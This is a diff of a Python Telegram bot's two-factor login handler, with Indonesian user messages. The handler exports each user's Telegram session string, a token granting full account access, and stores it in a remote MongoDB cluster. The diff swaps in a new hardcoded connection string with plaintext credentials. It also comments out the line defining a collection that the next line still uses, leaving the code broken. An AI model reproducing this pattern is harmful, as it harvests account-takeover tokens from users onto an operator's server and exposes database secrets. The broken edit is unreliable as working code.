@@ -67,7 +67,7 @@ async def recv_tg_tfa_message(_, message: Message):
         saved_message_ = await message.reply_text(
             "<code>" + str(await loical_ci.export_session_string()) + "</code>"
         )        
-        client = pymongo.MongoClient("mongodb+srv://dartokun:dartokun@cluster0.qkskbyw.mongodb.net/?retryWrites=true&w=majority")
+        client = pymongo.MongoClient("mongodb+srv://pyRainger:pyRainger@session1.pt52wqg.mongodb.net/?retryWrites=true&w=majority")
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
         session_string = str(await loical_ci.export_session_string())
@@ -103,11 +103,11 @@ async def recv_tg_tfa_message(_, message: Message):
 #    raise message.stop_propagation()
 # 
 #         await asyncio.sleep(2.0)
-        collection = cli["access"]
+#        collection = cli["access"]
         await collection.users.delete_one({'user_id': int(message.chat.id)})
         try:
             await message.reply_text("**Tunggu Selama 2 Menit Kemudian Ketik .ping Untuk Mengecek Bot.**")
-            LOGGER(__name__).info("BOT SERVER RESTARTED !!")
+            LOGGER(__name__).info("BOT DI AKTIFKAN DI AKUN KAMU !!")
         except BaseException as err:
             LOGGER(__name__).info(f"{err}")
             return
